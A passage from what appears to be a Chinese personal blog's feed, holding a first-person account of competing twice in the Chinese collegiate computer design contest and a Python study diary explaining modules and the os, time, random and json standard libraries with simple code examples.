      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>连续两年参加4C大赛心得</title>
      <link href="/2022/08/01/4C_think/"/>
      <url>/2022/08/01/4C_think/</url>
      
        <content type="html"><![CDATA[<h1 id="一、4C大赛简介"><a href="#一、4C大赛简介" class="headerlink" title="一、4C大赛简介"></a>一、4C大赛简介</h1><h2 id="1、大赛简介"><a href="#1、大赛简介" class="headerlink" title="1、大赛简介"></a>1、大赛简介</h2><p>中国大学生计算机设计大赛（下面简称“大赛”）是由教育部高等学校计算机类专业教学指导委员会、教育部高等学校软件工程专业教学指导委员会、教育部高等学校大学计算机课程教学指导委员会、教育部高等学校文科计算机基础教学指导分委员会、中国教育电视台联合主办。</p><h2 id="2、大赛目的"><a href="#2、大赛目的" class="headerlink" title="2、大赛目的"></a>2、大赛目的</h2><p>“大赛”的目的是提高大学生综合素质，具体落实教育部高等学校计算机基础课程教学指导委员会编写的《高等学校计算机基础教学发展战略研究报告暨计算机基础课程教学基本要求》，以及教育部高等学校文科计算机基础教学指导委员会编写的《文科类专业大学计算机教学要求》，进一步推动高校本科面向21世纪的计算机教学的知识体系、课程体系、教学内容和教学方法的改革，引导学生踊跃参加课外科技活动，激发学生学习计算机知识技能的兴趣和潜能，为培养德智体美全面发展、具有运用信息技术解决实际问题的综合实践能力、创新创业能力，以及团队合作意识的人才服务。</p><h2 id="3、大赛流程"><a href="#3、大赛流程" class="headerlink" title="3、大赛流程"></a>3、大赛流程</h2><h3 id="（1）一般是官网12月发比赛通知，来年寒假就可以开始准备作品。"><a href="#（1）一般是官网12月发比赛通知，来年寒假就可以开始准备作品。" class="headerlink" title="（1）一般是官网12月发比赛通知，来年寒假就可以开始准备作品。"></a>（1）一般是官网12月发比赛通知，来年寒假就可以开始准备作品。</h3><h3 id="（2）参赛学校也会在第二年2月左右发校赛通知，一般校赛截止到4月30日。"><a href="#（2）参赛学校也会在第二年2月左右发校赛通知，一般校赛截止到4月30日。" class="headerlink" title="（2）参赛学校也会在第二年2月左右发校赛通知，一般校赛截止到4月30日。"></a>（2）参赛学校也会在第二年2月左右发校赛通知，一般校赛截止到4月30日。</h3><h3 id="（3）校赛筛除一部分作品，提交到省赛，省赛结果和上推国赛名单一般在6月左右。"><a href="#（3）校赛筛除一部分作品，提交到省赛，省赛结果和上推国赛名单一般在6月左右。" class="headerlink" title="（3）校赛筛除一部分作品，提交到省赛，省赛结果和上推国赛名单一般在6月左右。"></a>（3）校赛筛除一部分作品，提交到省赛，省赛结果和上推国赛名单一般在6月左右。</h3><h3 id="（4）国赛会分布在7月和8月，按照赛区和大类进行，举办时间官网有说到。"><a href="#（4）国赛会分布在7月和8月，按照赛区和大类进行，举办时间官网有说到。" class="headerlink" title="（4）国赛会分布在7月和8月，按照赛区和大类进行，举办时间官网有说到。"></a>（4）国赛会分布在7月和8月，按照赛区和大类进行，举办时间官网有说到。</h3><h3 id="（5）国赛答辩结束后一两天闭幕式上宣布所获奖项。"><a href="#（5）国赛答辩结束后一两天闭幕式上宣布所获奖项。" class="headerlink" title="（5）国赛答辩结束后一两天闭幕式上宣布所获奖项。"></a>（5）国赛答辩结束后一两天闭幕式上宣布所获奖项。</h3><h3 id="（6）下学期开学后国赛证书以及省赛证书才会到达学校。"><a href="#（6）下学期开学后国赛证书以及省赛证书才会到达学校。" class="headerlink" title="（6）下学期开学后国赛证书以及省赛证书才会到达学校。"></a>（6）下学期开学后国赛证书以及省赛证书才会到达学校。</h3><h1 id="二、第14届参赛过程"><a href="#二、第14届参赛过程" class="headerlink" title="二、第14届参赛过程"></a>二、第14届参赛过程</h1><h2 id="1、校赛"><a href="#1、校赛" class="headerlink" title="1、校赛"></a>1、校赛</h2><p>记忆很深刻，当时准备上课，老师还没来，组长给我发来了消息，询问我是否有空参加大赛，他们组缺少一个队员，我仔细询问了一番，因为我很害怕我的加入给团队带来不了什么，一番斟酌后我选择了加入。<br>我们这次所做的作品类别是数媒静态设计普通组，小类是平面设计，因为我们有两名计算机专业的同学，一名机电专业的同学，所以我们选择了制作海报。<br>每一届的数媒类作品都会有一个主题，这届的主题是运动，因为平时还要上课，所以我们只能挑选晚上或者公休的时候讨论和制作海报，当然，要想凭空制作海报，首先就得多考虑多想多查资料，指导老师也很负责很专业，在开会过程中，每个人都充分的发表了自己的想法，经过一段时期的折磨，先是确定了海报主题，版式设计为左右版式，然后便是主体图形、广告语和细节的处理了，最后我们提交了作品，校赛结果下来后，可能因为我们的作品还不够完善，所以校赛得到了二等奖，并且被推省赛，要注意，每个学校在每一类进入省赛国赛的数量是有限制的。（校赛不收费）</p><h2 id="2、省赛"><a href="#2、省赛" class="headerlink" title="2、省赛"></a>2、省赛</h2><p>注意，14届和15届参赛流程以及比赛规则有所改变，14届的流程不建议参考，请参考15届。<br>14届的时候会有两个时间短允许完善作品，当我们被推省赛后，继续完善作品，加班加点，在校赛作品的基础上又有所改变，我在本次比赛中负责了广告语的设计以及PPT视频的制作，还有海报其他方面的问题解决。<br>省赛会有个日期，告诉你于几月几日几点后就不允许更改作品了，别以为可以瞒天过海，大赛一直用着百度网盘，我们所有的作品都需要根据比赛要求放到百度网盘中，而众所周知，百度网盘可以看到修改日期。<br>有些地方校赛省赛是直接出结果的，也就是说不需要答辩，据我所知大部分是这样，所以重头戏在校赛前和国赛前。省赛也需要一个月去评选，公布结果，一个是获奖结果，一个是上推国赛结果，最终我们取得了山西省一等奖，并且上推国赛（注意：一等奖不一定会被推国赛，三等奖不一定不会被推国赛，主要根据作品数量，如果数量多，一等奖就多，推国赛的也多，如果数量少，一等奖就很少，二三等奖也可能会被推国赛）。（省赛费用各省似乎不一样，我们是100元）</p><h2 id="3、国赛"><a href="#3、国赛" class="headerlink" title="3、国赛"></a>3、国赛</h2><p>当被确认上推国赛后，允许有四五天时间完善作品，可以更改百度网盘里的东西（15届就不允许了），但作品不能大改，只允许更改小问题小细节。<br>我们在这个阶段没有更改多少，便一直等待国赛通知，国赛都是在暑假举行的，之前是线下举行，这两年都是线上举行。<br>收到通知后，会让参赛队伍加群，大群是按照大类分好的，快到国赛前几天会分开小群，各个小群同时答辩，我们组一直在联系答辩，当时我负责介绍作品，每天我们都会抽出几小时来走流程，根据ppt介绍作品，然后指导老师提问问题，我们当时总结了近30多个问题。<br>国赛前一天会进行模拟答辩，这是走流程，一般赛区都会顺便核验身份，所以一定要把身份证和学生证带回家，忘记了可以用照片，根据各赛区要求。核验身份是本人和学生证身份证同框，赛区志愿者截图。<br>国赛当天会在群内实时报告现在哪组正在答辩，哪一组准备，答辩是很方便的，准备的组会进入会议室的候场室，轮到该组答辩才会被主持人邀请入会议，所以我们是无法看到别的组答辩过程的。<br>当时我们答辩后，三个评委老师各点评了一番，给予了几点建议，我们准备的30个问题没有被问到，那种感觉就像拳头打在棉花上。<br>全部答辩结束后，会有一下午或者一天的时间选出特色作品，并且组织他们答辩彩排，最后一天的流程便是特色作品点评以及闭幕式，在闭幕式上宣布获奖名单，不会发文档，挨个读，如果有保研需要的同学可以提前联系赛区老师，询问是否有电子版，当然需要大赛全部结束后。<br>最终我们组在14届中国大学生计算机设计大赛中获得了国家二等奖，山西省一等奖，获奖是有比例的，一般一等奖是参加国赛的7%左右，二等奖20%左右，三等奖50%左右，还会有一些没有奖项或者决赛入围奖。（国赛参赛费用是600元，有的学校报销，有的学校不报销）。<img src="http://120.48.107.243:9090/blog/2023/04/03/a231db6d98934b2db07f5a8286ced78d.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/355065932bce4849a7f452c8e5a9df51.png" alt="在这里插入图片描述"></p><h1 id="三、第15届参赛过程"><a href="#三、第15届参赛过程" class="headerlink" title="三、第15届参赛过程"></a>三、第15届参赛过程</h1><h2 id="1、校赛-1"><a href="#1、校赛-1" class="headerlink" title="1、校赛"></a>1、校赛</h2><p>15届（2022）中国大学生计算机设计大赛，我已经是大四的学生了，这一次我自己为组长，带领了两个队伍，一个为数媒静态设计普通组，另一个为数媒游戏与交互设计，今年的比赛有了改变，从校赛开始就有了作品编号，并且需要将作品上传到比赛平台，而且5月后就不允许更改作品了，所有作品更改日期必须在规定日期前（注意，如果百度网盘中没有ppt和视频，则国赛答辩时不允许使用）。<br>因为有两个组，海报这个组有总共有三位同学，一位同学没法来学校，刚开始差点放弃，今年的主题是“学汉语用汉字，弘扬汉语言文化”，我们绞尽脑汁想了很多方案，有一段时间我们都很崩溃，但在指导老师的带领和指导下，我们的作品终于有了雏形，而且原创性以及创意点都很好。<br>另一个组是做的AR虚拟现实，总共五位同学，但技术只有我会，所以我挑了大梁，好歹最后也实现了该有的效果，开发出app，在安卓7.0以上使用，扫描制作的海报可以学习儒家五常以及了解背后的故事。<br>最终校赛海报获得了一等奖，AR获得了二等奖，两个作品全部被推省赛。</p><h2 id="2、省赛-1"><a href="#2、省赛-1" class="headerlink" title="2、省赛"></a>2、省赛</h2><p>当我们被推省赛后，作品我记得是不允许更改了，所以我们只能静待佳音，需要一个月的时间去等待省赛组委会的评审，所以这块也没什么可注意的细节，不过和14届一样，需要交100元的报名费。最终海报获得山西省一等奖，AR获得山西省二等奖，惊喜的是两个作品全部确认被推国赛，我本以为AR会止步于此。</p><h2 id="3、国赛-1"><a href="#3、国赛-1" class="headerlink" title="3、国赛"></a>3、国赛</h2><p>当被确认上推国赛后，后面的流程就和去年一样了，加群，等通知，分小群，模拟答辩，核验身份，正式答辩，两组作品我也各自准备了二三十个问题，连续一周多每天晚上都演练，当然，因为要兼顾两个组，所以有时候会冲突，今年的答辩整体感觉不错，准备的问题评论老师问到好多，介绍作品也没什么问题。<br>不过遗憾的是没有取得一等奖，最后海报获得了国家二等奖，山西省一等奖。AR获得了国家三等奖，山西省二等奖，也算是圆满了吧，现在也已经毕业了，不能再参加了。<br>奖状还没发。</p><h1 id="四、感悟与后记"><a href="#四、感悟与后记" class="headerlink" title="四、感悟与后记"></a>四、感悟与后记</h1><p>实际上刚上大一的时候，甚至到了大二，听到学长学姐在哪些哪些比赛获得了成就，我就感觉他们很厉害，总感觉自己能力不行，做不到，不过当我走到这一步的时候，发现，并不是不厉害，也不是厉害，而是一定的付出一定会得到一定的汇报，在连续两年的比赛中，过程结果对我都是很好的，过程中我们互相勉励，互相打气，团结协作非常重要，一定要沟通，生活中也是这样，不沟通会有很多误会，也非常感谢在这两年中的指导老师以及我的队员，以及身边的朋友们对我的支持和帮助。<br>各位看客有什么问题可以评论，我都会回复，谢谢大家。</p>]]></content>
      
      
      <categories>
          
          <category> 经历 </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 经历 </tag>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习日记（十七）</title>
      <link href="/2022/07/24/python_seventeen/"/>
      <url>/2022/07/24/python_seventeen/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/f54ac64acb7347f796b984da66c66201-20230403140026404.png" alt="在这里插入图片描述"><br>&#x3D;&#x3D;本篇文章记录的是Python内置模块和requests模块知识。&#x3D;&#x3D;</p><h1 id="一、模块的介绍"><a href="#一、模块的介绍" class="headerlink" title="一、模块的介绍"></a>一、模块的介绍</h1><h2 id="1、模块是什么"><a href="#1、模块是什么" class="headerlink" title="1、模块是什么"></a>1、模块是什么</h2><blockquote><p>模块 就是一系列功能 ( 函数 ) 的集合体</p></blockquote><p><strong>模块的分类</strong></p><ul><li>内置模块                         c语言写的模块&#x2F;python中自带的</li><li>第三方模块                      别人写好的模块&#x2F;从网上下载</li><li>自定义模块                      自己自定义的</li></ul><p><code>一个python文件本身就是一个模块 , 文件名m.py , 模块名叫m</code></p><h2 id="2、-为什么要用模块"><a href="#2、-为什么要用模块" class="headerlink" title="2、 为什么要用模块"></a>2、 为什么要用模块</h2><ol><li>内置与第三方的模块拿来就可以用，无需定义，这种拿来主义,可以极大的<strong>提升自己的开发效率</strong></li><li>可以将程序的各部分功能提取出来放到一模块中<strong>为大家共享使用</strong></li><li><strong>减少了代码冗余</strong>，程序组织结构更加清晰</li></ol><h2 id="3、-模块怎么使用"><a href="#3、-模块怎么使用" class="headerlink" title="3、 模块怎么使用"></a>3、 模块怎么使用</h2><p><strong>import</strong> 导入</p><p><strong>[创建模块]</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># m.py</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;======我是m模块中的print代码=====&#x27;</span>)</span><br><span class="line">x1 = <span class="number">100</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">arg</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;get ========%s&quot;</span> % arg)</span><br></pre></td></tr></table></figure><p><strong>[导入模块]</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一种方式</span></span><br><span class="line"><span class="comment"># import m</span></span><br><span class="line"><span class="comment"># 模块导入的时候,里面的代码会执行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 模块里面内容的访问</span></span><br><span class="line"><span class="comment"># 语法</span></span><br><span class="line"><span class="comment"># 模块名.属性名</span></span><br><span class="line"><span class="comment"># print(m.x1)</span></span><br><span class="line"><span class="comment"># print(m.get(200))</span></span><br></pre></td></tr></table></figure><p>有点类似于 php 中的 inclde 包含 , 包含进来的文件 , 你是不是可以使用该文件里面定义好的功能</p><p><strong>from … import ….</strong>  导入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># foo.py</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;======foo=====&#x27;</span>)</span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">arg</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;get ========%s&quot;</span> % arg)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第二种方式</span></span><br><span class="line"><span class="comment"># from ... import ....  导入</span></span><br><span class="line"><span class="comment"># from foo import x           # from 模块 import 名字</span></span><br><span class="line"><span class="comment"># print(x)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> foo <span class="keyword">import</span> get</span><br><span class="line"></span><br><span class="line">get(<span class="number">100</span>)               <span class="comment"># 100</span></span><br></pre></td></tr></table></figure><p>简单了解的导入方式 , 我们来学习一下常见的内置模块</p><p>补充 : 为什么你在别人的poc也好还是exp也好 , 总是有这样一个身影 , 就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line">    </span><br><span class="line"><span class="comment"># main还好 , 是个函数 , 大家都知道 , 但是为什么要写在if __name__ == &#x27;__main__&#x27;: , 我想调用他直接main()</span></span><br><span class="line"><span class="comment"># 不就好了吗 , 这是因为什么呢 ? 当py脚本当成模块导入的时候我们知道 , 代码会被执行 , 假如有人一不小心把你的这个py脚本当成模块导入了 , 那不就自动执行了吗? 这个判断就是为了防止这件事情的发生的</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># __name__ 就是一个特殊的变量而已</span></span><br><span class="line"><span class="comment"># 当py脚本当成模块导入 __name__ 是不等于 &#x27;__main__&#x27; 的 , 只有执行运行改脚本才是 __name__ == &#x27;__main__&#x27;</span></span><br></pre></td></tr></table></figure><p>包和模块的不同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">模块是一个单独的文件</span><br><span class="line">包是一个文件夹 , 并且该文件夹下必须有一个 __init__.py这样的文件</span><br><span class="line">导入包时 , 会自动运行  __init__.py 里面的代码</span><br></pre></td></tr></table></figure><p>其他的导入形式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np      <span class="comment"># as简单理解就是起别名 , 然后可以通过  别名.名字  调用属性</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;base64&#x27;</span>)       <span class="comment"># 以字符串形式导入 base64</span></span><br></pre></td></tr></table></figure><h1 id="二、内置模块"><a href="#二、内置模块" class="headerlink" title="二、内置模块"></a>二、内置模块</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">无需下载直接导入即可使用 , 是安装python就已经在你的电脑上安装好了的</span><br></pre></td></tr></table></figure><h2 id="1、os模块"><a href="#1、os模块" class="headerlink" title="1、os模块"></a>1、os模块</h2><p><strong>os系列</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.getcwd()  <span class="comment"># 获取当前工作目录(pwd)，即当前python脚本工作的目录路径</span></span><br><span class="line">os.chdir(<span class="string">&quot;dirname&quot;</span>)  <span class="comment"># 改变当前脚本工作目录;相当于shell下cd</span></span><br><span class="line">os.curdir  <span class="comment"># 返回当前目录:(&#x27;.&#x27;)</span></span><br><span class="line">os.pardir  <span class="comment"># 获取当前目录的父目录字符串名:( &#x27;..&#x27;)</span></span><br><span class="line">os.mkdir(<span class="string">&#x27;dirname&#x27;</span>)  <span class="comment"># 生成单级目录;相当于shell中mkdir dirname</span></span><br><span class="line">os.makedirs(<span class="string">&#x27;dirname1/dirname2&#x27;</span>)  <span class="comment"># 可生成多层递归目录</span></span><br><span class="line">os.rmdir(<span class="string">&#x27;dirname&#x27;</span>)  <span class="comment"># 删除单级空目录，若目录不为空则无法删除，报错;相当于shell中rmdir dirname</span></span><br><span class="line">os.listdir(<span class="string">&#x27;dirname&#x27;</span>)  <span class="comment"># 列出指定目录下的所有文件和子目录，包括隐藏文件，并以列表方式打印</span></span><br><span class="line">os.remove(<span class="string">&quot;filename&quot;</span>)  <span class="comment"># 删除一个文件</span></span><br><span class="line">os.removedirs(<span class="string">&#x27;dirname1&#x27;</span>)  <span class="comment"># 若目录为空,则删除,并递归到上一级目录，如若也为空，则删除,并递归倒上一层</span></span><br><span class="line">os.rename(<span class="string">&quot;oldname&quot;</span>, <span class="string">&quot;newname&quot;</span>)  <span class="comment"># 重命名文件/目录</span></span><br><span class="line">os.name  <span class="comment"># 输出字符串指示当前使用平台。win-&gt; &#x27;nt &#x27;; Linux-&gt;&#x27;posix&#x27;</span></span><br><span class="line">os.system(<span class="string">&quot;bash command&quot;</span>)  <span class="comment"># 运行shell命令，直接显示</span></span><br></pre></td></tr></table></figure><p><strong>os.path系列</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">os.path.abspath(<span class="string">&#x27;path&#x27;</span>)  <span class="comment"># 返回path规范化(符合平台的路径分隔符)的绝对路径</span></span><br><span class="line">os.path.split(<span class="string">&#x27;path&#x27;</span>)  <span class="comment"># 将path(path的分隔符必须是/)分割成目录和文件名二元组返回</span></span><br><span class="line">os.path.dirname(path) <span class="comment"># 返回path的目录。其实就是os.path.split(path)的第一个元素</span></span><br><span class="line">os.path.basename(path) <span class="comment"># 返回path最后的文件名。如何path以/或\结尾，那么就会返回空值。即os.path.split(path)的第二个元素</span></span><br><span class="line">os.path.exists(path) <span class="comment"># 如果path存在，返回True;如果path不存在，返回Falseos.path.isabs (path)如果path是绝对路径，返回True</span></span><br><span class="line">os.path.isfile(path) <span class="comment"># 如果path是一个存在的文件，返回True。否则返回False</span></span><br><span class="line">os.path.isdir(path) <span class="comment"># 如果path是一个存在的目录，则返回True。否则返回False</span></span><br><span class="line">os.path.join(path1[, path2[，...]]) <span class="comment"># 将多个路径组合后返回，第一个绝对路径之前的参数将被忽略</span></span><br></pre></td></tr></table></figure><p>常用 :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">os.remove(<span class="string">&quot;filename&quot;</span>)  <span class="comment"># 删除一个文件</span></span><br><span class="line">os.rename(<span class="string">&quot;oldname&quot;</span>, <span class="string">&quot;newname&quot;</span>)  <span class="comment"># 重命名文件/目录</span></span><br><span class="line">os.name  <span class="comment"># 输出字符串指示当前使用平台。win-&gt; &#x27;nt &#x27;; Linux-&gt;&#x27;posix&#x27;</span></span><br><span class="line">os.system(<span class="string">&quot;bash command&quot;</span>)  <span class="comment"># 运行shell命令，直接显示</span></span><br><span class="line">os.path.isfile(path) <span class="comment"># 如果path是一个存在的文件，返回True。否则返回False</span></span><br><span class="line">os.path.isdir(path) <span class="comment"># 如果path是一个存在的目录，则返回True。否则返回False</span></span><br><span class="line">os.path.abspath(<span class="string">&#x27;path&#x27;</span>)  <span class="comment"># 返回path规范化(符合平台的路径分隔符)的绝对路径</span></span><br><span class="line">os.path.exists(path) <span class="comment"># 如果path存在，返回True;如果path不存在，返回Falseos.path.isabs (path)如果path是绝对路径，返回True</span></span><br><span class="line">os.path.join(path1[, path2[，...]]) <span class="comment"># 将多个路径组合后返回，第一个绝对路径之前的参数将被忽略</span></span><br></pre></td></tr></table></figure><h2 id="2、time模块"><a href="#2、time模块" class="headerlink" title="2、time模块"></a>2、time模块</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 时间分为三种格式</span></span><br><span class="line"><span class="comment"># 1.时间戳:从1970年到现在经过的秒数</span></span><br><span class="line"><span class="comment">#     作用:用于时间间隔的计算</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(time.time())  <span class="comment"># 1630411655.8108306</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(time.time()))  <span class="comment"># &lt;class &#x27;float&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.按照某种格式显示的时间:2021-08-31 11:11:11</span></span><br><span class="line"><span class="comment">#     作用:用于展示时间</span></span><br><span class="line"><span class="comment"># %Y-%m-%d %H:%M:%S</span></span><br><span class="line"><span class="comment">#  年  月 日 时 分 秒</span></span><br><span class="line"><span class="comment"># %H:%M:%S == %X , %p代表上下午</span></span><br><span class="line"><span class="built_in">print</span>(time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>))  <span class="comment"># 2021-08-31 20:08:42</span></span><br><span class="line"><span class="built_in">print</span>(time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S %p&quot;</span>))  <span class="comment"># 2021-08-31 20:08:42 PM</span></span><br><span class="line"><span class="built_in">print</span>(time.strftime(<span class="string">&quot;%Y-%m-%d %X&quot;</span>))  <span class="comment"># 2021-08-31 20:08:42</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(time.strftime(<span class="string">&quot;%Y-%m-%d %X&quot;</span>)))  <span class="comment"># &lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.延时</span></span><br><span class="line">time.sleep(<span class="number">3</span>)    <span class="comment"># 程序运行到这行代码的时候会延时3秒</span></span><br></pre></td></tr></table></figure><h2 id="3、random模块"><a href="#3、random模块" class="headerlink" title="3、random模块"></a>3、random模块</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(random.random())<span class="comment">#(0,1)----float    大于0且小于1之间的小数</span></span><br><span class="line"><span class="built_in">print</span>(random.randint(<span class="number">1</span>,<span class="number">3</span>))  <span class="comment">#[1,3]    大于等于1且小于等于3之间的整数</span></span><br><span class="line"><span class="built_in">print</span>(random.randrange(<span class="number">1</span>,<span class="number">3</span>)) <span class="comment">#[1,3)    大于等于1且小于3之间的整数</span></span><br><span class="line"><span class="built_in">print</span>(random.choice([<span class="number">1</span>,<span class="string">&#x27;23&#x27;</span>,[<span class="number">4</span>,<span class="number">5</span>]]))<span class="comment">#1或者23或者[4,5]</span></span><br><span class="line"><span class="built_in">print</span>(random.sample([<span class="number">1</span>,<span class="string">&#x27;23&#x27;</span>,[<span class="number">4</span>,<span class="number">5</span>]],<span class="number">2</span>))<span class="comment">#列表元素任意2个组合</span></span><br><span class="line"><span class="built_in">print</span>(random.uniform(<span class="number">1</span>,<span class="number">3</span>))<span class="comment">#大于1小于3的小数，如1.927109612082716</span></span><br><span class="line"></span><br><span class="line">item=[<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>]</span><br><span class="line">random.shuffle(item) <span class="comment">#打乱item的顺序,相当于&quot;洗牌&quot;</span></span><br><span class="line"><span class="built_in">print</span>(item)</span><br></pre></td></tr></table></figure><p>示例 : 随机的6位数验证码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_code</span>(<span class="params">n</span>):</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        s1 = <span class="built_in">str</span>(random.randint(<span class="number">0</span>, <span class="number">9</span>))</span><br><span class="line">        res += s1</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(make_code(<span class="number">6</span>))</span><br></pre></td></tr></table></figure><h2 id="4、json模块"><a href="#4、json模块" class="headerlink" title="4、json模块"></a>4、json模块</h2><p>准备知识 : 了解什么是序列化 , 什么是反序列化 ?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">序列化指的是把内存中的数据类型转换成一个特定的格式的内容</span><br><span class="line"></span><br><span class="line">反序列化指的是把一个特定的格式的内容转化成当前平台在内存中的一个数据类型</span><br><span class="line"></span><br><span class="line">对于我们后面写python代码 , 就是 json格式的字符串--&gt;python对象(字典)  反序列化</span><br><span class="line">python对象(字典) --&gt; json格式的字符串 序列化  (用到的不多)</span><br></pre></td></tr></table></figure><p> 为什么要进行序列化和反序列化呢?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span 